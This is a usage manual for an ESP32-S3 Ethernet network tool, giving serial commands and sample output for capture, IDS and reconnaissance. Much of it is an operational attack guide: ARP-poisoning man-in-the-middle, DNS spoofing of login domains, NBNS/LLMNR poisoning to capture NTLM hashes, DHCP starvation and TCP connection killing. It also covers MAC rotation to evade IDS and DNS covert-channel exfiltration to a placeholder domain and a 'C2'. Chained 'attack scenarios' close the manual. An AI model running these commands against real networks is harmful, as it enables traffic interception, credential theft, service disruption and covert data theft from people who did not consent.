# eth0 — ESP32-S3 Network Security Tool

## Complete Feature Guide & Usage Reference

**Hardware:** Waveshare ESP32-S3-ETH (W5500 Ethernet + SD Card)
**Interface:** Serial console at 115200 baud

---

## Table of Contents

1. [Getting Started](#1-getting-started)
2. [Packet Capture](#2-packet-capture)
3. [Capture Filters](#3-capture-filters)
4. [Packet Injection](#4-packet-injection)
5. [Network Reconnaissance](#5-network-reconnaissance)
   - [ARP Sweep](#arp-sweep)
   - [Port Scanner (SYN Probe)](#port-scanner)
   - [Service Scanner (Banner Grab)](#service-scanner)
   - [VLAN Discovery](#vlan-discovery)
   - [STP Topology Mapping](#stp-topology-mapping)
   - [LLDP/CDP Neighbor Discovery](#lldpcdp-neighbor-discovery)
   - [mDNS/NBNS Host Discovery](#mdnsnbns-host-discovery)
6. [Intrusion Detection System (IDS)](#6-intrusion-detection-system)
7. [OS Fingerprinting](#7-os-fingerprinting)
8. [ARP Spoofing / MitM](#8-arp-spoofing--mitm)
9. [DNS Spoofing](#9-dns-spoofing)
10. [TCP RST Injection (Connection Killing)](#10-tcp-rst-injection)
11. [DHCP Starvation](#11-dhcp-starvation)
12. [NBNS/LLMNR Poisoning](#12-nbnsllmnr-poisoning)
13. [MAC Address Spoofing](#13-mac-address-spoofing)
14. [Packet Replay](#14-packet-replay)
15. [Encrypted UDP Tunnel](#15-encrypted-udp-tunnel)
16. [DNS Covert Channel](#16-dns-covert-channel)
17. [UDP Chat](#17-udp-chat)
18. [Live Packet Stats](#18-live-packet-stats)
19. [Hexdump / PCAP-over-Serial](#19-hexdump--pcap-over-serial)
20. [Syslog Alert Forwarding](#20-syslog-alert-forwarding)
21. [Persistent Config (NVS)](#21-persistent-config)
22. [Combined Attack Scenarios](#22-combined-attack-scenarios)

---

## 1. Getting Started

### First Boot

Connect the ESP32-S3-ETH to your network via Ethernet and open a serial terminal at 115200 baud. On power-up you'll see:

```
=== ESP32-S3-ETH Packet Capture & Injection + IDS ===
[SD] Card ready. Size: 7552 MB
[ETH] MAC: 02:CA:FE:BA:BE:01
[ETH] Requesting IP via DHCP...
[ETH] DHCP OK! IP: 192.168.1.42  GW: 192.168.1.1  DNS: 192.168.1.1
[ETH] MACRAW socket opened on socket 0
[SD] Opened /capture_0000.pcap
[CAPTURE] Started. Filter: none (capturing all)
[IDS] Detection engine ACTIVE
```

The device is now:
- Capturing all Ethernet frames to SD card in PCAP format
- Running the IDS engine on every packet
- Listening for serial commands

### Quick Command Reference

| Command | Description |
|---------|-------------|
| `s` | Stop/start capture |
| `f` | Show current filter |
| `ids` | Toggle IDS on/off |
| `stats` | Show packet statistics |
| `recon fingerprint` | Show OS fingerprints |
| `recon sweep` | ARP sweep local subnet |

Type any command and press Enter.

---

## 2. Packet Capture

The device captures raw Ethernet frames in promiscuous mode (sees ALL traffic on the wire, not just traffic addressed to it) and writes them to SD card in PCAP format, readable by Wireshark.

### Start/Stop Capture

```
s
```
Toggles capture on/off. When paused, the file is safely committed to SD.

### Capture Files

Files are named `capture_0000.pcap`, `capture_0001.pcap`, etc. They auto-rotate at 10 MB. Files are committed to the FAT filesystem every 2 seconds or every 20 packets, so they survive unexpected power loss.

### Viewing Captures

Remove the SD card and open the `.pcap` files in Wireshark on your computer:

```
wireshark capture_0000.pcap
```

---

## 3. Capture Filters

Filters control which packets are written to the PCAP file. IDS analysis always runs on ALL packets regardless of filter.

### Show Current Filter

```
f
```

### Clear Filter (Capture Everything)

```
f none
```

### Filter by Protocol

```
f arp          # ARP packets only
f tcp          # TCP only
f udp          # UDP only
f icmp         # ICMP only
f ipv4         # All IPv4
f ipv6         # All IPv6
```

### Filter by Port

```
f port 80      # HTTP traffic
f port 443     # HTTPS traffic
f port 22      # SSH
f port 53      # DNS
```

### Filter by IP Address

```
f ip 192.168.1.50
```

Captures packets where 192.168.1.50 is either the source or destination.

### Filter by MAC Address

```
f mac AA:BB:CC:DD:EE:FF
```

---

## 4. Packet Injection

Craft and send packets directly onto the wire.

### Send ICMP Ping

```
send ping 192.168.1.1
```

Output:
```
[TX] ICMP ping -> 192.168.1.1 seq=0 (74 bytes) OK
```

### Send ARP Request

```
send arp 192.168.1.50
```

Sends an ARP "who-has" query. Useful for discovering if a host is online and learning its MAC address.

### Send UDP Packet

```
send udp 192.168.1.50 9999 Hello World
```

Sends a UDP packet to 192.168.1.50 port 9999 with payload "Hello World".

### Send Raw Ethernet Frame

```
send raw FF FF FF FF FF FF 02 CA FE BA BE 01 08 06 ...
```

Send an arbitrary Ethernet frame from hex bytes. Minimum 14 bytes (Ethernet header). Spaces, colons, and dashes are stripped.

---

## 5. Network Reconnaissance

### ARP Sweep

Discover all live hosts on a subnet by sending ARP "who-has" requests.

```
recon sweep                    # Sweep our own /24 subnet
recon sweep 192.168.1.0/24     # Sweep a specific subnet
```

Output:
```
[RECON] ARP sweep: 192.168.1.1 - 192.168.1.254
  [FOUND] 192.168.1.1 -> AA:BB:CC:DD:EE:01
  [FOUND] 192.168.1.50 -> AA:BB:CC:DD:EE:02
  [FOUND] 192.168.1.100 -> AA:BB:CC:DD:EE:03
[RECON] ARP sweep done. 254 sent, 3 hosts found.
```

Discovered hosts are automatically added to the ARP table, which is used by other features (MitM, port scanning, etc.).

### Port Scanner

TCP SYN probe — sends SYN packets and listens for SYN-ACK (open) or RST (closed).

```
recon ports 192.168.1.50              # Scan common ports
recon ports 192.168.1.50 22,80,443    # Scan specific ports
```

Output:
```
[RECON] TCP SYN probe: 192.168.1.50 (23 ports)
  [OPEN]   22/tcp
  [OPEN]   80/tcp
  [OPEN]   443/tcp

  Open:     3 (22, 80, 443)
  Closed:   18
  Filtered: 2
```

### Service Scanner

Full TCP handshake + banner grab. Identifies running services.

```
recon scan 192.168.1.50               # Scan common ports
recon scan 192.168.1.50 22,80,443     # Scan specific ports
```

Output:
```
[SCAN] Service scan: 192.168.1.50 (3 ports)
[SCAN] Target MAC: AA:BB:CC:DD:EE:02
[SCAN] PORT       STATE    SERVICE
[SCAN] ─────────────────────────────────────────────
[SCAN] 22   /tcp  open     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
[SCAN] 80   /tcp  open     HTTP/1.1 200 OK|Server: nginx/1.18.0
[SCAN] 443  /tcp  open     HTTP/1.1 200 OK|Server: nginx/1.18.0
```

**Tip:** Run `recon sweep` first so the ARP table has the target's MAC address. The service scanner uses ARP table entries for proper MAC resolution.

### VLAN Discovery

Sends 802.1Q-tagged ARP probes on VLAN IDs 1–100 to discover active VLANs on trunk ports.

```
recon vlan
```

Output:
```
[RECON] 802.1Q VLAN discovery (VLANs 1-100)...
  [VLAN] ID 1 - active (tagged response received)
  [VLAN] ID 10 - active
  [VLAN] ID 20 - active
[RECON] VLAN discovery done. 3 active VLANs found.
```

If no VLANs are found, the port is likely in access mode rather than trunk mode.

### STP Topology Mapping

Passively captures Spanning Tree Protocol BPDUs to map the network's bridge topology.

```
recon stp              # Show discovered topology
recon stp on           # Enable live BPDU monitoring
recon stp off          # Disable live monitoring
recon stp clear        # Clear bridge table
```

Output:
```
[STP] ═══ Spanning Tree Topology ═══

  ROOT BRIDGE (RSTP):
    Bridge ID:  8000.AA:BB:CC:DD:EE:01
    Timers:     hello=2s  maxAge=20s  fwdDelay=15s
    Seen:       2s ago

  BRIDGES:
  ──────────────────────────────────────────────────────────────
  Ver    Bridge ID                Cost     Port     Flags  Seen
  ──────────────────────────────────────────────────────────────
  RSTP   8000.AA:BB:CC:DD:EE:01  0        0x8001   Desg   2s [ROOT]
  RSTP   8000.AA:BB:CC:DD:EE:02  4        0x8002   Root   3s

  2 bridge(s) tracked
```

BPDUs are sent every ~2 seconds by switches, so just wait a few seconds after connecting.

When live monitoring is enabled (`recon stp on`), every BPDU is printed as it arrives:

```
[STP] RSTP BPDU: bridge=8000:AA:BB:CC:DD:EE:01 root=8000:AA:BB:CC:DD:EE:01 cost=0 port=0x8001 [ROOT]
```

### LLDP/CDP Neighbor Discovery

Passively captures LLDP and Cisco CDP frames to discover switch infrastructure.

```
recon lldp             # Show discovered neighbors
recon cdp              # Same command (shared table)
```

Output:
```
[LLDP/CDP] ═══ Network Neighbors ═══

  [LLDP] AA:BB:CC:DD:EE:01 (seen 15s ago)
    Chassis: switch01.example.com
    Port:    GigabitEthernet0/1
    Name:    switch01
    Desc:    Cisco IOS Software, C2960 24-port
    VLAN:    10

  1 neighbor(s)
```

LLDP is sent every 30 seconds, CDP every 60 seconds. Just leave the device connected and neighbors will be discovered automatically.

**What this reveals:** Switch hostnames, port numbers you're connected to, VLAN assignments, switch model/firmware, management addresses.

### mDNS/NBNS Host Discovery

Passively listens for mDNS (Multicast DNS, port 5353) and NetBIOS Name Service (NBNS, port 137) traffic to discover hosts and services without sending any probes.

```
recon mdns
```

Output:
```
[MDNS] ═══ Discovered Hosts ═══
  IP               Hostname                       Service      Seen
  ──────────────────────────────────────────────────────────────
  192.168.1.50     macbook-pro.local              -            5s
  192.168.1.100    DESKTOP-ABC123                 NBNS         12s
  192.168.1.150    raspberrypi.local              -            30s

  3 host(s)
```

This is completely passive — no packets are sent. It discovers hosts by listening to their name resolution traffic.

---

## 6. Intrusion Detection System

The IDS runs on every captured packet and detects:

- **ARP spoofing** — IP-to-MAC binding changes
- **ARP flooding** — gratuitous ARP reply storms
- **Rogue DHCP servers** — unauthorized DHCP responses
- **Port scans** — single source hitting many ports
- **Cleartext credentials** — HTTP Basic Auth, FTP USER/PASS, Telnet, POP3, SMTP
- **DNS spoofing** — mismatched or duplicate DNS responses

### Commands

```
ids              # Toggle IDS on/off
ids stats        # Show detection statistics
ids arp          # Show ARP table (IP→MAC bindings)
ids dhcp         # Show known DHCP servers
ids reset        # Clear all IDS tables
```

### Example Output

```
[ALERT #1][CRIT] ARP SPOOF? 192.168.1.1 changed from AA:BB:CC:DD:EE:01 to 11:22:33:44:55:66
[ALERT #2][CRIT] ROGUE DHCP SERVER! Offer from 192.168.1.200 (11:22:33:44:55:66)
[ALERT #3][CRIT] PORT SCAN detected from 192.168.1.100 (10+ ports in 5s)
[ALERT #4][CRIT] CLEARTEXT HTTP Basic Auth: 192.168.1.50:52341 -> 192.168.1.100:80
```

The NeoPixel LED provides visual feedback:
- **Green** = normal capture
- **Yellow** = warning alert
- **Red** = critical alert
- **Purple** = cleartext credentials detected
- **Blue** = startup/paused
- **Orange** = MitM active

---

## 7. OS Fingerprinting

Passively identifies operating systems by analyzing TCP SYN and SYN-ACK packets. Examines TTL, window size, MSS, SACK, and window scale options.

```
recon fingerprint
```

Output:
```
[FINGERPRINT] ═══ OS Fingerprints ═══
  IP               OS Guess           TTL  Win    MSS   Opts
  ──────────────────────────────────────────────────────────
  192.168.1.1      Network device     255  65535  1460  SACK WS=0
  192.168.1.50     Linux              64   29200  1460  SACK WS=7
  192.168.1.100    Windows 10/11      128  64240  1460  SACK WS=8
  192.168.1.150    macOS/iOS          64   65535  1460  SACK WS=6

  4 host(s) fingerprinted
```

This is completely passive — no traffic is generated. The fingerprint table populates automatically as TCP handshakes occur on the network.

---

## 8. ARP Spoofing / MitM

Poisons ARP caches of a target victim and the gateway so their traffic flows through the ESP32, enabling full traffic interception.

### Start MitM

```
mitm start 192.168.1.50
```

Output:
```
[MITM] Resolving victim 192.168.1.50...
[MITM] Victim MAC:  AA:BB:CC:DD:EE:02
[MITM] Resolving gateway 192.168.1.1...
[MITM] Gateway MAC: AA:BB:CC:DD:EE:01
[MITM] ══════════════════════════════════════
[MITM] ACTIVE: 192.168.1.50 <---> 192.168.1.1
[MITM] ARP poison sent every 2 seconds
[MITM] Captured traffic written to PCAP
[MITM] Use 'mitm stop' to restore and stop
[MITM] ══════════════════════════════════════
```

### How It Works

1. Resolves the MAC addresses of both the victim and gateway
2. Sends gratuitous ARP replies to the victim saying "the gateway is at OUR MAC"
3. Sends gratuitous ARP replies to the gateway saying "the victim is at OUR MAC"
4. Re-poisons every 2 seconds to maintain the poisoned state
5. All intercepted traffic is captured to the PCAP file (promiscuous mode)

### Check Status

```
mitm status
```

### Stop and Restore

```
mitm stop
```

This sends 3 rounds of corrective ARP replies to restore the original MAC bindings on both sides.

**Tip:** Run `recon sweep` first so the ARP table is populated. Combine with `dnsspoof` and `f ip 192.168.1.50` for targeted interception.

---

## 9. DNS Spoofing

Intercepts DNS queries and responds with forged answers before the real DNS server can reply.

### Spoof All DNS Queries

```
dnsspoof start 192.168.1.42
```

Every DNS A-record query on the network will receive a response pointing to 192.168.1.42.

### Spoof Specific Domains

```
dnsspoof add example.com 192.168.1.42
dnsspoof add login.bank.com 10.0.0.1
```

Domain matching is suffix-based, so `example.com` also matches `www.example.com`, `mail.example.com`, etc.

### Show Active Rules

```
dnsspoof list
```

Output:
```
[DNSSPOOF] Status: ACTIVE  |  Total spoofed: 47
  [0] example.com -> 192.168.1.42  (hits: 32)
  [1] login.bank.com -> 10.0.0.1  (hits: 15)
```

### Remove a Rule

```
dnsspoof remove example.com
```

### Stop All Spoofing

```
dnsspoof stop
```

**Best combined with MitM:** Run `mitm start` first to intercept the victim's DNS queries, then `dnsspoof` to redirect them.

---

## 10. TCP RST Injection

Kill active TCP connections by injecting RST packets. A passive TCP connection tracker runs in the background, recording sequence numbers from observed traffic.

### List Tracked Connections

```
kill list
```

Output:
```
[KILL] Active TCP connections:
  192.168.1.50:52341 <-> 93.184.216.34:443 (2s ago)
  192.168.1.50:52342 <-> 93.184.216.34:80 (5s ago)
  192.168.1.100:55123 <-> 192.168.1.50:22 (1s ago)
```

### Kill All Connections for an IP

```
kill 192.168.1.50
```

RSTs all tracked connections involving 192.168.1.50.

### Kill a Specific Port

```
kill 192.168.1.50:80
```

RSTs only connections to/from port 80 on that IP.

### How It Works

1. The TCP tracker passively observes all TCP packets and records source/destination IPs, ports, and current sequence/ACK numbers
2. When you issue a `kill` command, it sends RST packets from both directions using the tracked sequence numbers
3. Multiple RSTs are sent (3 per direction) for reliability
4. Connections expire from the tracker after 60 seconds of inactivity

**Tip:** This works best when you can see the traffic (e.g., on a hub, from a TAP, or via MitM).

---

## 11. DHCP Starvation

Exhausts the DHCP server's address pool by flooding DHCP DISCOVER packets with random spoofed MAC addresses. Each request appears to come from a different device.

### Start Starvation

```
dhcpstarve start
```

Output:
```
[DHCPSTARVE] ACTIVE — flooding DHCP DISCOVER packets
[DHCPSTARVE] 50 DISCOVER packets sent
[DHCPSTARVE] 100 DISCOVER packets sent
```

### Stop

```
dhcpstarve stop
```

Output:
```
[DHCPSTARVE] Stopped. 254 packets sent.
```

### How It Works

Every 100ms, sends a DHCP DISCOVER with:
- Random locally-administered source MAC in the Ethernet header
- Same random MAC in the DHCP `chaddr` field
- Random transaction ID
- Broadcast flag set

The DHCP server will offer an IP to each unique MAC, eventually exhausting its pool. New legitimate clients will be unable to get an address.

**Warning:** This is highly disruptive to the network. Use only on isolated test networks.

---

## 12. NBNS/LLMNR Poisoning

Responds to Windows name resolution broadcasts (NBNS on port 137, LLMNR on port 5355) with our IP address, causing Windows hosts to connect to us instead of the intended target.

### Enable Poisoning

```
poison on
```

Output:
```
[POISON] NBNS/LLMNR poisoning ENABLED
[POISON] Responding to name queries with our IP
[POISON] LLMNR: FILESERVER -> 192.168.1.42 (from 192.168.1.100)
[POISON] NBNS: PRINTER01 -> 192.168.1.42 (from 192.168.1.50)
```

### Disable

```
poison off
```

### How It Works

When a Windows host can't resolve a name via DNS, it falls back to:
1. **LLMNR** (Link-Local Multicast Name Resolution, port 5355) — sends a multicast query
2. **NBNS** (NetBIOS Name Service, port 137) — sends a broadcast query

We respond to both with our IP address. This is commonly used to capture NTLMv2 hashes when the victim tries to authenticate to us (pair with Responder on a PC for hash capture).

**Typical attack flow:**
```
poison on                          # Start responding to name queries
mitm start 192.168.1.50            # Optionally MitM the victim
```

---

## 13. MAC Address Spoofing

Change the device's MAC address on the fly for anonymity or impersonation.

### Set Specific MAC

```
mac set DE:AD:BE:EF:CA:FE
```

### Generate Random MAC

```
mac random
```

Generates a random locally-administered unicast MAC address.

### Restore Original MAC

```
mac reset
```

### Auto-Rotate MAC

```
mac auto 30          # New random MAC every 30 seconds
mac auto 60          # Every 60 seconds
mac auto off         # Stop auto-rotation
```

### Show Current MAC

```
mac
```

Output:
```
[MAC] Current: DE:AD:BE:EF:CA:FE (spoofed) [auto: 30s]
```

### How It Works

Changes the MAC address in both:
1. The global `mac[]` array used for all packet crafting (Ethernet source MAC)
2. The W5500's SHAR (Source Hardware Address Register) so the hardware uses the new MAC

Auto-rotation generates a new random MAC at the specified interval, useful for avoiding MAC-based tracking or IDS detection.

---

## 14. Packet Replay

Replay previously captured PCAP files from the SD card onto the wire.

### Basic Replay

```
replay capture_0000.pcap
```

### Replay with Delay

```
replay capture_0000.pcap 10
```

Adds 10ms delay between each replayed frame. Useful for rate-limiting to avoid flooding the network.

### Output

```
[REPLAY] Playing /capture_0000.pcap (delay=10ms)...
[REPLAY] 100 packets sent...
[REPLAY] 200 packets sent...
[REPLAY] Done. 247 sent, 0 errors.
```

### Abort Replay

Press any key during replay to abort.

### Use Cases

- **Replay an attack** for analysis or demonstration
- **Stress testing** — replay high-traffic captures
- **Protocol testing** — replay specific packet sequences
- **IDS testing** — replay captures containing known attack signatures

---

## 15. Encrypted UDP Tunnel

Establishes an AES-128-CBC encrypted point-to-point communication channel over UDP. Uses the ESP32-S3's hardware AES acceleration for fast encryption.

### Start Tunnel

Both sides must use the same key. The key is 32 hex characters (128-bit AES key).

```
tunnel start 192.168.1.100 0123456789ABCDEF0123456789ABCDEF
```

Output:
```
[TUNNEL] ACTIVE — peer 192.168.1.100 port 9998
[TUNNEL] Type 'tunnel send <message>' to send encrypted data
```

### Send Encrypted Message

```
tunnel send Hello, this is a secret message!
```

Output:
```
[TUNNEL] Sent (32 bytes encrypted)
```

### Receiving Messages

Incoming encrypted messages are automatically decrypted and displayed:

```
[TUNNEL] #0 from 192.168.1.100: Hello back!
```

### Change Port

```
tunnel port 12345
```

### Stop Tunnel

```
tunnel stop
```

### Packet Format

Each tunnel packet is a UDP datagram containing:

| Field | Size | Description |
|-------|------|-------------|
| Magic | 2 bytes | `0xE7E0` identifier |
| Sequence | 4 bytes | Packet counter |
| IV | 16 bytes | Random initialization vector |
| Ciphertext | Variable | AES-128-CBC encrypted data + PKCS#7 padding |

### Two-Device Setup

**Device A (192.168.1.42):**
```
tunnel start 192.168.1.100 DEADBEEFCAFEBABE0123456789ABCDEF
tunnel send Hello from A!
```

**Device B (192.168.1.100):**
```
tunnel start 192.168.1.42 DEADBEEFCAFEBABE0123456789ABCDEF
tunnel send Hello from B!
```

Both devices must use the same key. A PC-side script could also participate by implementing the same packet format.

---

## 16. DNS Covert Channel

Exfiltrates data by encoding it as base32 subdomains in DNS A queries. The data is carried in the query name itself, making it look like normal DNS traffic to firewalls and IDS.

### Setup

```
covert dns server 8.8.8.8                 # DNS server to send queries to
covert dns domain exfil.example.com        # Base domain (default: c.local)
```

### Send Data

```
covert dns send "sensitive data here"
```

Output:
```
[COVERT] Sent 21 bytes as DNS query #0
```

### What Gets Sent

The data "sensitive data here" is base32-encoded and sent as a DNS A query:

```
ONXW2ZJAMRQXIYJOONQXE6JAMRZXM.s0.exfil.example.com  A  IN
```

A DNS server (or custom listener) at the other end can decode the subdomain labels to recover the data.

### Show Status

```
covert dns
```

Output:
```
[COVERT] DNS channel: configured (3 queries sent)
```

### How It Works

1. Data is base32-encoded (DNS-safe character set: A-Z, 2-7)
2. Encoded data is split into DNS labels (max 63 characters each)
3. A sequence number label is appended for ordering
4. The base domain is appended as the suffix
5. Sent as a standard DNS A query to the configured server

### Custom Listener

On the receiving end, capture DNS queries and decode:

```python
# Python pseudo-code for receiver
import base64
for query in dns_queries:
    labels = query.name.split('.')
    encoded = labels[0]  # base32 data
    seq = labels[1]      # sequence number (s0, s1, ...)
    data = base64.b32decode(encoded)
    print(f"Received: {data}")
```

---

## 17. UDP Chat

Real-time bidirectional messaging over UDP.

### Start Chat with Specific Peer

```
chat 192.168.1.100
chat 192.168.1.100 5000    # Custom port (default 9999)
```

### Listen Mode

```
chat listen                 # Wait for incoming messages
chat listen 5000            # Listen on custom port
```

### Send Messages

Once chat is active, type any text that isn't a command:

```
Hello, are you there?
```

Output:
```
[CHAT] you: Hello, are you there?
[CHAT] 192.168.1.100: Yes, I'm here!
```

### Stop Chat

```
chat off
```

---

## 18. Live Packet Stats

Real-time traffic statistics with protocol breakdown and top talkers.

### Show Stats

```
stats
```

Output:
```
[STATS] ═══ Packet Statistics ═══
  Window:   45.2 seconds
  Packets:  1247 (27.6 pkt/s)
  Traffic:  892416 bytes (157.8 Kbps)
  ── Protocol Breakdown ──
    TCP:   876 (70%)
    UDP:   245 (19%)
    ARP:   87 (6%)
    ICMP:  15 (1%)
    Other: 24 (1%)
  ── Top Talkers ──
    192.168.1.50   523 pkts  412890 bytes
    192.168.1.1    287 pkts  198234 bytes
    192.168.1.100  156 pkts  134567 bytes
  ── Capture ──
    Saved: 1247 | Filtered: 0 | Sent: 42 | Alerts: 3
    File: capture_0001.pcap | Free heap: 245632 bytes
```

### Auto-Print Stats

```
stats auto          # Print every 5 seconds (default)
stats auto 10       # Print every 10 seconds
stats off           # Stop auto-print
```

### Reset Counters

```
stats reset
```

---

## 19. Hexdump / PCAP-over-Serial

### Live Hex Dump

Human-readable hex+ASCII dump of every captured packet:

```
hexdump on
```

Output:
```
[HEX] ── Packet #42 (74 bytes) EtherType=0x0800 ──
  0000  FF FF FF FF FF FF 02 CA  FE BA BE 01 08 00 45 00  |..............E.|
  0010  00 3C 1C 46 40 00 40 06  A1 B2 C0 A8 01 2A C0 A8  |.<.F@.@......*..|
  0020  01 01 C0 18 00 50 00 00  00 01 00 00 00 00 A0 02  |.....P..........|
  ...
```

**Warning:** High traffic will flood the serial output. Use capture filters to limit volume.

```
hexdump off
```

### Binary PCAP-over-Serial

Stream raw PCAP data over serial for real-time Wireshark analysis without needing the SD card:

```
hexdump pcap on
```

**Piping to Wireshark (Linux):**
```bash
cat /dev/ttyUSB0 | wireshark -k -i -
```

**Or with socat:**
```bash
socat TCP-LISTEN:19000 /dev/ttyUSB0,raw,b115200 &
wireshark -k -i TCP:localhost:19000
```

Stop the binary stream:
```
hexdump pcap off
```

**Note:** When PCAP serial mode is on, all other serial text output is suppressed to avoid corrupting the binary stream.

---

## 20. Syslog Alert Forwarding

Forward IDS alerts to a remote syslog server over UDP. Compatible with rsyslog, syslog-ng, Graylog, Splunk, etc.

### Enable Syslog

```
syslog 192.168.1.200            # Standard port 514
syslog 192.168.1.200 1514       # Custom port
```

### Send Test Message

```
syslog test
```

### Show Status

```
syslog
```

Output:
```
[SYSLOG] ACTIVE -> 192.168.1.200:514 (23 msgs sent)
```

### Disable

```
syslog off
```

### Message Format

Alerts are sent as RFC 5424 syslog messages:

```
<34>eth0 IDS: ARP SPOOF? 192.168.1.1 changed from AA:BB:CC:DD:EE:01 to 11:22:33:44:55:66
```

Priority mapping:
- Critical alerts → syslog severity 2 (Critical)
- Warning alerts → syslog severity 4 (Warning)
- Info alerts → syslog severity 6 (Informational)
- Facility: 4 (LOG_AUTH)

### Quick rsyslog Setup

On your syslog server, add to `/etc/rsyslog.conf`:
```
module(load="imudp")
input(type="imudp" port="514")
:programname, isequal, "eth0" /var/log/eth0-ids.log
```

---

## 21. Persistent Config

Save settings to ESP32 flash (NVS) so they survive power cycles.

### Save Current Settings

```
config save
```

Saves: IDS state, capture filter, auto-stats settings, syslog configuration.

### Reload from Flash

```
config load
```

### Clear Saved Config

```
config clear
```

Settings are automatically loaded on boot. After clearing, defaults are used on next power-up.

---

## 22. Combined Attack Scenarios

### Scenario 1: Full Network Reconnaissance

```
# 1. Discover all hosts
recon sweep

# 2. Identify switch infrastructure
recon lldp

# 3. Check for VLANs
recon vlan

# 4. Check STP topology
recon stp

# 5. Wait for OS fingerprints to populate
recon fingerprint

# 6. Scan interesting hosts
recon ports 192.168.1.50
recon scan 192.168.1.50 22,80,443

# 7. Check for passively discovered services
recon mdns
```

### Scenario 2: MitM + DNS Redirect + Credential Capture

```
# 1. Discover the target
recon sweep

# 2. Start ARP poisoning
mitm start 192.168.1.50

# 3. Redirect their DNS
dnsspoof add login.example.com 192.168.1.42

# 4. Also capture Windows hash attempts
poison on

# 5. Filter capture to just the victim's traffic
f ip 192.168.1.50

# 6. Forward alerts to your monitoring server
syslog 192.168.1.200

# 7. Watch stats
stats auto 5

# 8. When done, clean up
mitm stop
dnsspoof stop
poison off
```

### Scenario 3: Covert Exfiltration

```
# 1. Spoof your MAC for anonymity
mac random

# 2. Set up encrypted tunnel to your C2
tunnel start 10.0.0.5 DEADBEEFCAFEBABE0123456789ABCDEF

# 3. Or exfiltrate via DNS (harder to detect)
covert dns server 8.8.8.8
covert dns domain data.yourdomain.com
covert dns send "target network map: 192.168.1.0/24, 3 hosts, switch: Cisco 2960"

# 4. Auto-rotate MAC to avoid tracking
mac auto 60
```

### Scenario 4: Network Disruption Testing

```
# 1. Kill a specific connection
kill 192.168.1.50:443

# 2. Exhaust the DHCP pool
dhcpstarve start
# ... wait ...
dhcpstarve stop

# 3. Replay a previously captured attack
replay attack_capture.pcap 5
```

### Scenario 5: Passive Monitoring (Zero Footprint)

```
# Everything below generates NO traffic — purely passive
s                       # Ensure capture is running
stats auto 10           # Watch traffic patterns
recon fingerprint       # OS identification
recon lldp              # Switch discovery (listening only)
recon mdns              # Host discovery (listening only)
recon stp               # Topology mapping (listening only)
ids stats               # Check for anomalies
```

---

## Hardware Notes

### Pin Mapping

| Function | Pin |
|----------|-----|
| W5500 MISO | GPIO 12 |
| W5500 MOSI | GPIO 11 |
| W5500 SCK | GPIO 13 |
| W5500 CS | GPIO 14 |
| W5500 RST | GPIO 9 |
| W5500 INT | GPIO 10 |
| SD MISO | GPIO 5 |
| SD MOSI | GPIO 6 |
| SD SCK | GPIO 7 |
| SD CS | GPIO 4 |
| NeoPixel | GPIO 21 |

### Dual SPI Architecture

The W5500 and SD card run on separate SPI buses (SPI2 and SPI3), so there is no bus contention. Both operate independently and simultaneously.

### LED Color Reference

| Color | Meaning |
|-------|---------|
| Blue | Startup / capture paused |
| Green | Capturing normally |
| Yellow | IDS warning alert |
| Red | IDS critical alert |
| Purple | Cleartext credentials detected |
| Orange | MitM / DHCP starvation active |
